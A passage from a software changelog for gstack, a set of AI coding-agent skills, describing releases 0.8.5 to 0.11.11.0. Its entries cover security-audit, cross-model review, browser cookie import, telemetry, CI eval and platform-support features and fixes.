- **Phase-transition summaries.** Brief status at each phase boundary so you can track progress without waiting for the full pipeline.
- **Degradation matrix.** When Codex or the Claude subagent fails, autoplan gracefully degrades with clear labels (`[codex-only]`, `[subagent-only]`, `[single-reviewer mode]`).

## [0.11.11.0] - 2026-03-23. Community Wave 3

10 community PRs merged. bug fixes, platform support, and workflow improvements.

### Added

- **Chrome multi-profile cookie import.** You can now import cookies from any Chrome profile, not just Default. Profile picker shows account email for easy identification. Batch import across all visible domains.
- **Linux Chromium cookie import.** Cookie import now works on Linux for Chrome, Chromium, Brave, and Edge. Supports both GNOME Keyring (libsecret) and the "peanuts" fallback for headless environments.
- **Chrome extensions in browse sessions.** Set `BROWSE_EXTENSIONS_DIR` to load Chrome extensions (ad blockers, accessibility tools, custom headers) into your browse testing sessions.
- **Project-scoped gstack install.** `setup --local` installs gstack into `.claude/skills/` in your current project instead of globally. Useful for per-project version pinning.
- **Distribution pipeline checks.** `/office-hours`, `/plan-eng-review`, `/ship`, and `/review` now check whether new CLI tools or libraries have a build/publish pipeline. No more shipping artifacts nobody can download.
- **Dynamic skill discovery.** Adding a new skill directory no longer requires editing a hardcoded list. `skill-check` and `gen-skill-docs` automatically discover skills from the filesystem.
- **Auto-trigger guard.** Skills now include explicit trigger criteria in their descriptions to prevent Claude Code from auto-firing them based on semantic similarity. The existing proactive suggestion system is preserved.

### Fixed

- **Browse server startup crash.** The browse server lock acquisition failed when `.gstack/` directory didn't exist, causing every invocation to think another process held the lock. Fixed by creating the state directory before lock acquisition.
- **Zsh glob errors in skill preamble.** The telemetry cleanup loop no longer throws `no matches found` in zsh when no pending files exist.
- **`--force` now actually forces upgrades.** `gstack-upgrade --force` clears the snooze file, so you can upgrade immediately after snoozing.
- **Three-dot diff in /review scope drift detection.** Scope drift analysis now correctly shows changes since branch creation, not accumulated changes on the base branch.
- **CI workflow YAML parsing.** Fixed unquoted multiline `run:` scalars that broke YAML parsing. Added actionlint CI workflow.

### Community

Thanks to @osc, @Explorer1092, @Qike-Li, @francoisaubert1, @itstimwhite, @yinanli1917-cloud for contributions in this wave.

## [0.11.10.0] - 2026-03-23. CI Evals on Ubicloud

### Added

- **E2E evals now run in CI on every PR.** 12 parallel GitHub Actions runners on Ubicloud spin up per PR, each running one test suite. Docker image pre-bakes bun, node, Claude CLI, and deps so setup is near-instant. Results posted as a PR comment with pass/fail + cost breakdown.
- **3x faster eval runs.** All E2E tests run concurrently within files via `testConcurrentIfSelected`. Wall clock drops from ~18min to ~6min. limited by the slowest individual test, not sequential sum.
- **Docker CI image** (`Dockerfile.ci`) with pre-installed toolchain. Rebuilds automatically when Dockerfile or package.json changes, cached by content hash in GHCR.

### Fixed

- **Routing tests now work in CI.** Skills are installed at top-level `.claude/skills/` instead of nested under `.claude/skills/gstack/`. project-level skill discovery doesn't recurse into subdirectories.

### For contributors

- `EVALS_CONCURRENCY=40` in CI for maximum parallelism (local default stays at 15)
- Ubicloud runners at ~$0.006/run (10x cheaper than GitHub standard runners)
- `workflow_dispatch` trigger for manual re-runs

## [0.11.9.0] - 2026-03-23. Codex Skill Loading Fix

### Fixed

- **Codex no longer rejects gstack skills with "invalid SKILL.md".** Existing installs had oversized description fields (>1024 chars) that Codex silently rejected. The build now errors if any Codex description exceeds 1024 chars, setup always regenerates `.agents/` to prevent stale files, and a one-time migration auto-cleans oversized descriptions on existing installs.
- **`package.json` version now stays in sync with `VERSION`.** Was 6 minor versions behind. A new CI test catches future drift.

### Added

- **Codex E2E tests now assert no skill loading errors.** The exact "Skipped loading skill(s)" error that prompted this fix is now a regression test. `stderr` is captured and checked.
- **Codex troubleshooting entry in README.** Manual fix instructions for users who hit the loading error before the auto-migration runs.

### For contributors

- `test/gen-skill-docs.test.ts` validates all `.agents/` descriptions stay within 1024 chars
- `gstack-update-check` includes a one-time migration that deletes oversized Codex SKILL.md files
- P1 TODO added: Codex→Claude reverse buddy check skill

## [0.11.8.0] - 2026-03-23. zsh Compatibility Fix

### Fixed

- **gstack skills now work in zsh without errors.** Every skill preamble used a `.pending-*` glob pattern that triggered zsh's "no matches found" error on every invocation (the common case where no pending telemetry files exist). Replaced shell glob with `find` to avoid zsh's NOMATCH behavior entirely. Thanks to @hnshah for the initial report and fix in PR #332. Fixes #313.

### Added

- **Regression test for zsh glob safety.** New test verifies all generated SKILL.md files use `find` instead of bare shell globs for `.pending-*` pattern matching.

## [0.11.7.0] - 2026-03-23. /review → /ship Handoff Fix

### Fixed

- **`/review` now satisfies the ship readiness gate.** Previously, running `/review` before `/ship` always showed "NOT CLEARED" because `/review` didn't log its result and `/ship` only looked for `/plan-eng-review`. Now `/review` persists its outcome to the review log, and all dashboards recognize both `/review` (diff-scoped) and `/plan-eng-review` (plan-stage) as valid Eng Review sources.
- **Ship abort prompt now mentions both review options.** When Eng Review is missing, `/ship` suggests "run `/review` or `/plan-eng-review`" instead of only mentioning `/plan-eng-review`.

### For contributors

- Based on PR #338 by @malikrohail. DRY improvement per eng review: updated the shared `REVIEW_DASHBOARD` resolver instead of creating a duplicate ship-only resolver.
- 4 new validation tests covering review-log persistence, dashboard propagation, and abort text.

## [0.11.6.0] - 2026-03-23. Infrastructure-First Security Audit

### Added

- **`/cso` v2. start where the breaches actually happen.** The security audit now begins with your infrastructure attack surface (leaked secrets in git history, dependency CVEs, CI/CD pipeline misconfigurations, unverified webhooks, Dockerfile security) before touching application code. 15 phases covering secrets archaeology, supply chain, CI/CD, LLM/AI security, skill supply chain, OWASP Top 10, STRIDE, and active verification.
- **Two audit modes.** `--daily` runs a zero-noise scan with an 8/10 confidence gate (only reports findings it's highly confident about). `--comprehensive` does a deep monthly scan with a 2/10 bar (surfaces everything worth investigating).
- **Active verification.** Every finding gets independently verified by a subagent before reporting. no more grep-and-guess. Variant analysis: when one vulnerability is confirmed, the entire codebase is searched for the same pattern.
- **Trend tracking.** Findings are fingerprinted and tracked across audit runs. You can see what's new, what's fixed, and what's been ignored.
- **Diff-scoped auditing.** `--diff` mode scopes the audit to changes on your branch vs the base branch. perfect for pre-merge security checks.
- **3 E2E tests** with planted vulnerabilities (hardcoded API keys, tracked `.env` files, unsigned webhooks, unpinned GitHub Actions, rootless Dockerfiles). All verified passing.

### Changed

- **Stack detection before scanning.** v1 ran Ruby/Java/PHP/C# patterns on every project without checking the stack. v2 detects your framework first and prioritizes relevant checks.
- **Proper tool usage.** v1 used raw `grep` in Bash; v2 uses Claude Code's native `Grep` tool for reliable results without truncation.

## [0.11.5.2] - 2026-03-22. Outside Voice

### Added

- **Plan reviews now offer an independent second opinion.** After all review sections complete in `/plan-ceo-review` or `/plan-eng-review`, you can get a "brutally honest outside voice" from a different AI model (Codex CLI, or a fresh Claude subagent if Codex isn't installed). It reads your plan, finds what the review missed. logical gaps, unstated assumptions, feasibility risks. and presents findings verbatim. Optional, recommended, never blocks shipping.
- **Cross-model tension detection.** When the outside voice disagrees with the review findings, the disagreements are surfaced automatically and offered as TODOs so nothing gets lost.
- **Outside Voice in the Review Readiness Dashboard.** `/ship` now shows whether an outside voice ran on the plan, alongside the existing CEO/Eng/Design/Adversarial review rows.

### Changed

- **`/plan-eng-review` Codex integration upgraded.** The old hardcoded Step 0.5 is replaced with a richer resolver that adds Claude subagent fallback, review log persistence, dashboard visibility, and higher reasoning effort (`xhigh`).

## [0.11.5.1] - 2026-03-23. Inline Office Hours

### Changed

- **No more "open another window" for /office-hours.** When `/plan-ceo-review` or `/plan-eng-review` offer to run `/office-hours` first, it now runs inline in the same conversation. The review picks up right where it left off after the design doc is ready. Same for mid-session detection when you're still figuring out what to build.
- **Handoff note infrastructure removed.** The handoff notes that bridged the old "go to another window" flow are no longer written. Existing notes from prior sessions are still read for backward compatibility.

## [0.11.5.0] - 2026-03-23. Bash Compatibility Fix

### Fixed

- **`gstack-review-read` and `gstack-review-log` no longer crash under bash.** These scripts used `source <(gstack-slug)` which silently fails to set variables under bash with `set -euo pipefail`, causing `SLUG: unbound variable` errors. Replaced with `eval "$(gstack-slug)"` which works correctly in both bash and zsh.
- **All SKILL.md templates updated.** Every template that instructed agents to run `source <(gstack-slug)` now uses `eval "$(gstack-slug)"` for cross-shell compatibility. Regenerated all SKILL.md files from templates.
- **Regression tests added.** New tests verify `eval "$(gstack-slug)"` works under bash strict mode, and guard against `source <(.*gstack-slug` patterns reappearing in templates or bin scripts.

## [0.11.4.0] - 2026-03-22. Codex in Office Hours

### Added

- **Your brainstorming now gets a second opinion.** After premise challenge in `/office-hours`, you can opt in to a Codex cold read. a completely independent AI that hasn't seen the conversation reviews your problem, answers, and premises. It steelmans your idea, identifies the most revealing thing you said, challenges one premise, and proposes a 48-hour prototype. Two different AI models seeing different things catches blind spots neither would find alone.
- **Cross-Model Perspective in design docs.** When you use the second opinion, the design doc automatically includes a `## Cross-Model Perspective` section capturing what Codex said. so the independent view is preserved for downstream reviews.
- **New founder signal: defended premise with reasoning.** When Codex challenges one of your premises and you keep it with articulated reasoning (not just dismissal), that's tracked as a positive signal of conviction.

## [0.11.3.0] - 2026-03-23. Design Outside Voices

### Added

- **Every design review now gets a second opinion.** `/plan-design-review`, `/design-review`, and `/design-consultation` dispatch both Codex (OpenAI) and a fresh Claude subagent in parallel to independently evaluate your design. then synthesize findings with a litmus scorecard showing where they agree and disagree. Cross-model agreement = high confidence; disagreement = investigate.
- **OpenAI's design hard rules baked in.** 7 hard rejection criteria, 7 litmus checks, and a landing-page vs app-UI classifier from OpenAI's "Designing Delightful Frontends" framework. merged with gstack's existing 10-item AI slop blacklist. Your design gets evaluated against the same rules OpenAI recommends for their own models.
- **Codex design voice in every PR.** The lightweight design review that runs in `/ship` and `/review` now includes a Codex design check when frontend files change. automatic, no opt-in needed.
- **Outside voices in /office-hours brainstorming.** After wireframe sketches, you can now get Codex + Claude subagent design perspectives on your approaches before committing to a direction.
- **AI slop blacklist extracted as shared constant.** The 10 anti-patterns (purple gradients, 3-column icon grids, centered everything, etc.) are now defined once and shared across all design skills. Easier to maintain, impossible to drift.

## [0.11.2.0] - 2026-03-22. Codex Just Works

### Fixed

- **Codex no longer shows "exceeds maximum length of 1024 characters" on startup.** Skill descriptions compressed from ~1,200 words to ~280 words. well under the limit. Every skill now has a test enforcing the cap.
- **No more duplicate skill discovery.** Codex used to find both source SKILL.md files and generated Codex skills, showing every skill twice. Setup now creates a minimal runtime root at `~/.codex/skills/gstack` with only the assets Codex needs. no source files exposed.
- **Old direct installs auto-migrate.** If you previously cloned gstack into `~/.codex/skills/gstack`, setup detects this and moves it to `~/.gstack/repos/gstack` so skills aren't discovered from the source checkout.
- **Sidecar directory no longer linked as a skill.** The `.agents/skills/gstack` runtime asset directory was incorrectly symlinked alongside real skills. now skipped.

### Added

- **Repo-local Codex installs.** Clone gstack into `.agents/skills/gstack` inside any repo and run `./setup --host codex`. skills install next to the checkout, no global `~/.codex/` needed. Generated preambles auto-detect whether to use repo-local or global paths at runtime.
- **Kiro CLI support.** `./setup --host kiro` installs skills for the Kiro agent platform, rewriting paths and symlinking runtime assets. Auto-detected by `--host auto` if `kiro-cli` is installed.
- **`.agents/` is now gitignored.** Generated Codex skill files are no longer committed. they're created at setup time from templates. Removes 14,000+ lines of generated output from the repo.

### Changed

- **`GSTACK_DIR` renamed to `SOURCE_GSTACK_DIR` / `INSTALL_GSTACK_DIR`** throughout the setup script for clarity about which path points to the source repo vs the install location.
- **CI validates Codex generation succeeds** instead of checking committed file freshness (since `.agents/` is no longer committed).

## [0.11.1.1] - 2026-03-22. Plan Files Always Show Review Status

### Added

- **Every plan file now shows review status.** When you exit plan mode, the plan file automatically gets a `GSTACK REVIEW REPORT` section. even if you haven't run any formal reviews yet. Previously, this section only appeared after running `/plan-eng-review`, `/plan-ceo-review`, `/plan-design-review`, or `/codex review`. Now you always know where you stand: which reviews have run, which haven't, and what to do next.

## [0.11.1.0] - 2026-03-22. Global Retro: Cross-Project AI Coding Retrospective

### Added

- **`/retro global`. see everything you shipped across every project in one report.** Scans your Claude Code, Codex CLI, and Gemini CLI sessions, traces each back to its git repo, deduplicates by remote, then runs a full retro across all of them. Global shipping streak, context-switching metrics, per-project breakdowns with personal contributions, and cross-tool usage patterns. Run `/retro global 14d` for a two-week view.
- **Per-project personal contributions in global retro.** Each project in the global retro now shows YOUR commits, LOC, key work, commit type mix, and biggest ship. separate from team totals. Solo projects say "Solo project. all commits are yours." Team projects you didn't touch show session count only.
- **`gstack-global-discover`. the engine behind global retro.** Standalone discovery script that finds all AI coding sessions on your machine, resolves working directories to git repos, normalizes SSH/HTTPS remotes for dedup, and outputs structured JSON. Compiled binary ships with gstack. no `bun` runtime needed.

### Fixed

- **Discovery script reads only the first few KB of session files** instead of loading entire multi-MB JSONL transcripts into memory. Prevents OOM on machines with extensive coding history.
- **Claude Code session counts are now accurate.** Previously counted all JSONL files in a project directory; now only counts files modified within the time window.
- **Week windows (`1w`, `2w`) are now midnight-aligned** like day windows, so `/retro global 1w` and `/retro global 7d` produce consistent results.

## [0.11.0.0] - 2026-03-22. /cso: Zero-Noise Security Audits

### Added

- **`/cso`. your Chief Security Officer.** Full codebase security audit: OWASP Top 10, STRIDE threat modeling, attack surface mapping, data classification, and dependency scanning. Each finding includes severity, confidence score, a concrete exploit scenario, and remediation options. Not a linter. a threat model.
- **Zero-noise false positive filtering.** 17 hard exclusions and 9 precedents adapted from Anthropic's security review methodology. DOS isn't a finding. Test files aren't attack surface. React is XSS-safe by default. Every finding must score 8/10+ confidence to make the report. The result: 3 real findings, not 3 real + 12 theoretical.
- **Independent finding verification.** Each candidate finding is verified by a fresh sub-agent that only sees the finding and the false positive rules. no anchoring bias from the initial scan. Findings that fail independent verification are silently dropped.
- **`browse storage` now redacts secrets automatically.** Tokens, JWTs, API keys, GitHub PATs, and Bearer tokens are detected by both key name and value prefix. You see `[REDACTED. 42 chars]` instead of the secret.
- **Azure metadata endpoint blocked.** SSRF protection for `browse goto` now covers all three major cloud providers (AWS, GCP, Azure).

### Fixed

- **`gstack-slug` hardened against shell injection.** Output sanitized to alphanumeric, dot, dash, and underscore only. All remaining `eval $(gstack-slug)` callers migrated to `source <(...)`.
- **DNS rebinding protection.** `browse goto` now resolves hostnames to IPs and checks against the metadata blocklist. prevents attacks where a domain initially resolves to a safe IP, then switches to a cloud metadata endpoint.
- **Concurrent server start race fixed.** An exclusive lockfile prevents two CLI invocations from both killing the old server and starting new ones simultaneously, which could leave orphaned Chromium processes.
- **Smarter storage redaction.** Key matching now uses underscore-aware boundaries (won't false-positive on `keyboardShortcuts` or `monkeyPatch`). Value detection expanded to cover AWS, Stripe, Anthropic, Google, Sendgrid, and Supabase key prefixes.
- **CI workflow YAML lint error fixed.**

### For contributors

- **Community PR triage process documented** in CONTRIBUTING.md.
- **Storage redaction test coverage.** Four new tests for key-based and value-based detection.

## [0.10.2.0] - 2026-03-22. Autoplan Depth Fix

### Fixed

- **`/autoplan` now produces full-depth reviews instead of compressing everything to one-liners.** When autoplan said "auto-decide," it meant "decide FOR the user using principles". but the agent interpreted it as "skip the analysis entirely." Now autoplan explicitly defines the contract: auto-decide replaces your judgment, not the analysis. Every review section still gets read, diagrammed, and evaluated. You get the same depth as running each review manually.
- **Execution checklists for CEO and Eng phases.** Each phase now enumerates exactly what must be produced. premise challenges, architecture diagrams, test coverage maps, failure registries, artifacts on disk. No more "follow that file at full depth" without saying what "full depth" means.
- **Pre-gate verification catches skipped outputs.** Before presenting the final approval gate, autoplan now checks a concrete checklist of required outputs. Missing items get produced before the gate opens (max 2 retries, then warns).
- **Test review can never be skipped.** The Eng review's test diagram section. the highest-value output. is explicitly marked NEVER SKIP OR COMPRESS with instructions to read actual diffs, map every codepath to coverage, and write the test plan artifact.

## [0.10.1.0] - 2026-03-22. Test Coverage Catalog

### Added

- **Test coverage audit now works everywhere. plan, ship, and review.** The codepath tracing methodology (ASCII diagrams, quality scoring, gap detection) is shared across `/plan-eng-review`, `/ship`, and `/review` via a single `{{TEST_COVERAGE_AUDIT}}` resolver. Plan mode adds missing tests to your plan before you write code. Ship mode auto-generates tests for gaps. Review mode finds untested paths during pre-landing review. One methodology, three contexts, zero copy-paste.
- **`/review` Step 4.75. test coverage diagram.** Before landing code, `/review` now traces every changed codepath and produces an ASCII coverage map showing what's tested (★★★/★★/★) and what's not (GAP). Gaps become INFORMATIONAL findings that follow the Fix-First flow. you can generate the missing tests right there.
- **E2E test recommendations built in.** The coverage audit knows when to recommend E2E tests (common user flows, tricky integrations where unit tests can't cover it) vs unit tests, and flags LLM prompt changes that need eval coverage. No more guessing whether something needs an integration test.
- **Regression detection iron rule.** When a code change modifies existing behavior, gstack always writes a regression test. no asking, no skipping. If you changed it, you test it.
- **`/ship` failure triage.** When tests fail during ship, the coverage audit classifies each failure and recommends next steps instead of just dumping the error output.
- **Test framework auto-detection.** Reads your CLAUDE.md for test commands first, then auto-detects from project files (package.json, Gemfile, pyproject.toml, etc.). Works with any framework.

### Fixed

- **gstack no longer crashes in repos without an `origin` remote.** The `gstack-repo-mode` helper now gracefully handles missing remotes, bare repos, and empty git output. defaulting to `unknown` mode instead of crashing the preamble.
- **`REPO_MODE` defaults correctly when the helper emits nothing.** Previously an empty response from `gstack-repo-mode` left `REPO_MODE` unset, causing downstream template errors.

## [0.10.0.0] - 2026-03-22. Autoplan

### Added

- **`/autoplan`. one command, fully reviewed plan.** Hand it a rough plan and it runs the full CEO → design → eng review pipeline automatically. Reads the actual review skill files from disk (same depth, same rigor as running each review manually) and makes intermediate decisions using 6 encoded principles: completeness, boil lakes, pragmatic, DRY, explicit over clever, bias toward action. Taste decisions (close approaches, borderline scope, codex disagreements) surface at a final approval gate. You approve, override, interrogate, or revise. Saves a restore point so you can re-run from scratch. Writes review logs compatible with `/ship`'s dashboard.

## [0.9.8.0] - 2026-03-21. Deploy Pipeline + E2E Performance

### Added

- **`/land-and-deploy`. merge, deploy, and verify in one command.** Takes over where `/ship` left off. Merges the PR, waits for CI and deploy workflows, then runs canary verification on your production URL. Auto-detects your deploy platform (Fly.io, Render, Vercel, Netlify, Heroku, GitHub Actions). Offers revert at every failure point. One command from "PR approved" to "verified in production."
- **`/canary`. post-deploy monitoring loop.** Watches your live app for console errors, performance regressions, and page failures using the browse daemon. Takes periodic screenshots, compares against pre-deploy baselines, and alerts on anomalies. Run `/canary https://myapp.com --duration 10m` after any deploy.
- **`/benchmark`. performance regression detection.** Establishes baselines for page load times, Core Web Vitals, and resource sizes. Compares before/after on every PR. Tracks performance trends over time. Catches the bundle size regressions that code review misses.
- **`/setup-deploy`. one-time deploy configuration.** Detects your deploy platform, production URL, health check endpoints, and deploy status commands. Writes the config to CLAUDE.md so all future `/land-and-deploy` runs are fully automatic.
- **`/review` now includes Performance & Bundle Impact analysis.** The informational review pass checks for heavy dependencies, missing lazy loading, synchronous script tags, and bundle size regressions. Catches moment.js-instead-of-date-fns before it ships.

### Changed

- **E2E tests now run 3-5x faster.** Structure tests default to Sonnet (5x faster, 5x cheaper). Quality tests (planted-bug detection, design quality, strategic review) stay on Opus. Full suite dropped from 50-80 minutes to ~15-25 minutes.
- **`--retry 2` on all E2E tests.** Flaky tests get a second chance without masking real failures.
- **`test:e2e:fast` tier.** Excludes the 8 slowest Opus quality tests for quick feedback (~5-7 minutes). Run `bun run test:e2e:fast` for rapid iteration.
- **E2E timing telemetry.** Every test now records `first_response_ms`, `max_inter_turn_ms`, and `model` used. Wall-clock timing shows whether parallelism is actually working.

### Fixed

- **`plan-design-review-plan-mode` no longer races.** Each test gets its own isolated tmpdir. no more concurrent tests polluting each other's working directory.
- **`ship-local-workflow` no longer wastes 6 of 15 turns.** Ship workflow steps are inlined in the test prompt instead of having the agent read the 700+ line SKILL.md at runtime.
- **`design-consultation-core` no longer fails on synonym sections.** "Colors" matches "Color", "Type System" matches "Typography". fuzzy synonym-based matching with all 7 sections still required.

## [0.9.7.0] - 2026-03-21. Plan File Review Report

### Added

- **Every plan file now shows which reviews have run.** After any review skill finishes (`/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, `/codex review`), a markdown table is appended to the plan file itself. showing each review's trigger command, purpose, run count, status, and findings summary. Anyone reading the plan can see review status at a glance without checking conversation history.
- **Review logs now capture richer data.** CEO reviews log scope proposal counts (proposed/accepted/deferred), eng reviews log total issues found, design reviews log before→after scores, and codex reviews log how many findings were fixed. The plan file report uses these fields directly. no more guessing from partial metadata.

## [0.9.6.0] - 2026-03-21. Auto-Scaled Adversarial Review

### Changed

- **Review thoroughness now scales automatically with diff size.** Small diffs (<50 lines) skip adversarial review entirely. no wasted time on typo fixes. Medium diffs (50–199 lines) get a cross-model adversarial challenge from Codex (or a Claude adversarial subagent if Codex isn't installed). Large diffs (200+ lines) get all four passes: Claude structured, Codex structured review with pass/fail gate, Claude adversarial subagent, and Codex adversarial challenge. No configuration needed. it just works.
- **Claude now has an adversarial mode.** A fresh Claude subagent with no checklist bias reviews your code like an attacker. finding edge cases, race conditions, security holes, and silent data corruption that the structured review might miss. Findings are classified as FIXABLE (auto-fixed) or INVESTIGATE (your call).
- **Review dashboard shows "Adversarial" instead of "Codex Review."** The dashboard row reflects the new multi-model reality. it tracks whichever adversarial passes actually ran, not just Codex.

## [0.9.5.0] - 2026-03-21. Builder Ethos

### Added

- **ETHOS.md. gstack's builder philosophy in one document.** Four principles: The Golden Age (AI compression ratios), Boil the Lake (completeness is cheap), Search Before Building (three layers of knowledge), and Build for Yourself. This is the philosophical source of truth that every workflow skill references.
- **Every workflow skill now searches before recommending.** Before suggesting infrastructure patterns, concurrency approaches, or framework-specific solutions, gstack checks if the runtime has a built-in and whether the pattern is current best practice. Three layers of knowledge. tried-and-true (Layer 1), new-and-popular (Layer 2), and first-principles (Layer 3). with the most valuable insights prized above all.
- **Eureka moments.** When first-principles reasoning reveals that conventional wisdom is wrong, gstack names it, celebrates it, and logs it. Your weekly `/retro` now surfaces these insights so you can see where your projects zigged while others zagged.
- **`/office-hours` adds Landscape Awareness phase.** After understanding your problem through questioning but before challenging premises, gstack searches for what the world thinks. then runs a three-layer synthesis to find where conventional wisdom might be wrong for your specific case.
- **`/plan-eng-review` adds search check.** Step 0 now verifies architectural patterns against current best practices and flags custom solutions where built-ins exist.
- **`/investigate` searches on hypothesis failure.** When your first debugging hypothesis is wrong, gstack searches for the exact error message and known framework issues before guessing again.
- **`/design-consultation` three-layer synthesis.** Competitive research now uses the structured Layer 1/2/3 framework to find where your product should deliberately break from category norms.
- **CEO review saves context when handing off to `/office-hours`.** When `/plan-ceo-review` suggests running `/office-hours` first, it now saves a handoff note with your system audit findings and any discussion so far. When you come back and re-invoke `/plan-ceo-review`, it picks up that context automatically. no more starting from scratch.

## [0.9.4.1] - 2026-03-20

### Changed

- **`/retro` no longer nags about PR size.** The retro still reports PR size distribution (Small/Medium/Large/XL) as neutral data, but no longer flags XL PRs as problems or recommends splitting them. AI reviews don't fatigue. the unit of work is the feature, not the diff.

## [0.9.4.0] - 2026-03-20. Codex Reviews On By Default

### Changed

- **Codex code reviews now run automatically in `/ship` and `/review`.** No more "want a second opinion?" prompt every time. Codex reviews both your code (with a pass/fail gate) and runs an adversarial challenge by default. First-time users get a one-time opt-in prompt; after that, it's hands-free. Configure with `gstack-config set codex_reviews enabled|disabled`.
- **All Codex operations use maximum reasoning power.** Review, adversarial, and consult modes all use `xhigh` reasoning effort. when an AI is reviewing your code, you want it thinking as hard as possible.
- **Codex review errors can't corrupt the dashboard.** Auth failures, timeouts, and empty responses are now detected before logging results, so the Review Readiness Dashboard never shows a false "passed" entry. Adversarial stderr is captured separately.
- **Codex review log includes commit hash.** Staleness detection now works correctly for Codex reviews, matching the same commit-tracking behavior as eng/CEO/design reviews.

### Fixed

- **Codex-for-Codex recursion prevented.** When gstack runs inside Codex CLI (`.agents/skills/`), the Codex review step is completely stripped. no accidental infinite loops.

## [0.9.3.0] - 2026-03-20. Windows Support

### Fixed

- **gstack now works on Windows 11.** Setup no longer hangs when verifying Playwright, and the browse server automatically falls back to Node.js to work around a Bun pipe-handling bug on Windows ([bun#4253](https://github.com/oven-sh/bun/issues/4253)). Just make sure Node.js is installed alongside Bun. macOS and Linux are completely unaffected.
- **Path handling works on Windows.** All hardcoded `/tmp` paths and Unix-style path separators now use platform-aware equivalents via a new `platform.ts` module. Path traversal protection works correctly with Windows backslash separators.

### Added

- **Bun API polyfill for Node.js.** When the browse server runs under Node.js on Windows, a compatibility layer provides `Bun.serve()`, `Bun.spawn()`, `Bun.spawnSync()`, and `Bun.sleep()` equivalents. Fully tested.
- **Node server build script.** `browse/scripts/build-node-server.sh` transpiles the server for Node.js, stubs `bun:sqlite`, and injects the polyfill. all automated during `bun run build`.

## [0.9.2.0] - 2026-03-20. Gemini CLI E2E Tests

### Added

- **Gemini CLI is now tested end-to-end.** Two E2E tests verify that gstack skills work when invoked by Google's Gemini CLI (`gemini -p`). The `gemini-discover-skill` test confirms skill discovery from `.agents/skills/`, and `gemini-review-findings` runs a full code review via gstack-review. Both parse Gemini's stream-json NDJSON output and track token usage.
- **Gemini JSONL parser with 10 unit tests.** `parseGeminiJSONL` handles all Gemini event types (init, message, tool_use, tool_result, result) with defensive parsing for malformed input. The parser is a pure function, independently testable without spawning the CLI.
- **`bun run test:gemini`** and **`bun run test:gemini:all`** scripts for running Gemini E2E tests independently. Gemini tests are also included in `test:evals` and `test:e2e` aggregate scripts.

## [0.9.1.0] - 2026-03-20. Adversarial Spec Review + Skill Chaining

### Added

- **Your design docs now get stress-tested before you see them.** When you run `/office-hours`, an independent AI reviewer checks your design doc for completeness, consistency, clarity, scope creep, and feasibility. up to 3 rounds. You get a quality score (1-10) and a summary of what was caught and fixed. The doc you approve has already survived adversarial review.
- **Visual wireframes during brainstorming.** For UI ideas, `/office-hours` now generates a rough HTML wireframe using your project's design system (from DESIGN.md) and screenshots it. You see what you're designing while you're still thinking, not after you've coded it.
- **Skills help each other now.** `/plan-ceo-review` and `/plan-eng-review` detect when you'd benefit from running `/office-hours` first and offer it. one-tap to switch, one-tap to decline. If you seem lost during a CEO review, it'll gently suggest brainstorming first.
- **Spec review metrics.** Every adversarial review logs iterations, issues found/fixed, and quality score to `~/.gstack/analytics/spec-review.jsonl`. Over time, you can see if your design docs are getting better.

## [0.9.0.1] - 2026-03-19

### Changed

- **Telemetry opt-in now defaults to community mode.** First-time prompt asks "Help gstack get better!" (community mode with stable device ID for trend tracking). If you decline, you get a second chance with anonymous mode (no unique ID, just a counter). Respects your choice either way.

### Fixed

- **Review logs and telemetry now persist during plan mode.** When you ran `/plan-ceo-review`, `/plan-eng-review`, or `/plan-design-review` in plan mode, the review result wasn't saved to disk. so the dashboard showed stale or missing entries even though you just completed a review. Same issue affected telemetry logging at the end of every skill. Both now work reliably in plan mode.

## [0.9.0] - 2026-03-19. Works on Codex, Gemini CLI, and Cursor

**gstack now works on any AI agent that supports the open SKILL.md standard.** Install once, use from Claude Code, OpenAI Codex CLI, Google Gemini CLI, or Cursor. All 21 skills are available in `.agents/skills/` -- just run `./setup --host codex` or `./setup --host auto` and your agent discovers them automatically.

- **One install, four agents.** Claude Code reads from `.claude/skills/`, everything else reads from `.agents/skills/`. Same skills, same prompts, adapted for each host. Hook-based safety skills (careful, freeze, guard) get inline safety advisory prose instead of hooks -- they work everywhere.
- **Auto-detection.** `./setup --host auto` detects which agents you have installed and sets up both. Already have Claude Code? It still works exactly the same.
- **Codex-adapted output.** Frontmatter is stripped to just name + description (Codex doesn't need allowed-tools or hooks). Paths are rewritten from `~/.claude/` to `~/.codex/`. The `/codex` skill itself is excluded from Codex output -- it's a Claude wrapper around `codex exec`, which would be self-referential.
- **CI checks both hosts.** The freshness check now validates Claude and Codex output independently. Stale Codex docs break the build just like stale Claude docs.

## [0.8.6] - 2026-03-19

### Added

- **You can now see how you use gstack.** Run `gstack-analytics` to see a personal usage dashboard. which skills you use most, how long they take, your success rate. All data stays local on your machine.
- **Opt-in community telemetry.** On first run, gstack asks if you want to share anonymous usage data (skill names, duration, crash info. never code or file paths). Choose "yes" and you're part of the community pulse. Change anytime with `gstack-config set telemetry off`.
- **Community health dashboard.** Run `gstack-community-dashboard` to see what the gstack community is building. most popular skills, crash clusters, version distribution. All powered by Supabase.
- **Install base tracking via update check.** When telemetry is enabled, gstack fires a parallel ping to Supabase during update checks. giving us an install-base count without adding any latency. Respects your telemetry setting (default off). GitHub remains the primary version source.
- **Crash clustering.** Errors are automatically grouped by type and version in the Supabase backend, so the most impactful bugs surface first.
- **Upgrade funnel tracking.** We can now see how many people see upgrade prompts vs actually upgrade. helps us ship better releases.
- **/retro now shows your gstack usage.** Weekly retrospectives include skill usage stats (which skills you used, how often, success rate) alongside your commit history.
- **Session-specific pending markers.** If a skill crashes mid-run, the next invocation correctly finalizes only that session. no more race conditions between concurrent gstack sessions.

## [0.8.5] - 2026-03-19

### Fixed

- **`/retro` now counts full calendar days.** Running a retro late at night no longer silently misses commits from earlier in the day. Git treats bare dates like `--since="2026-03-11"` as "11pm on March 11" if you run it at 11pm. now we pass `--since="2026-03-11T00:00:00"` so it always starts from midnight. Compare mode windows get the same fix.
- **Review log no longer breaks on branch names with `/`.** Branch names like `garrytan/design-system` caused review log writes to fail because Claude Code runs multi-line bash blocks as separate shell invocations, losing variables between commands. New `gstack-review-log` and `gstack-review-read` atomic helpers encapsulate the entire operation in a single command.
- **All skill templates are now platform-agnostic.** Removed Rails-specific patterns (`bin/test-lane`, `RAILS_ENV`, `.includes()`, `rescue StandardError`, etc.) from `/ship`, `/review`, `/plan-ceo-review`, and `/plan-eng-review`. The review checklist now shows examples for Rails, Node, Python, and Django side-by-side.
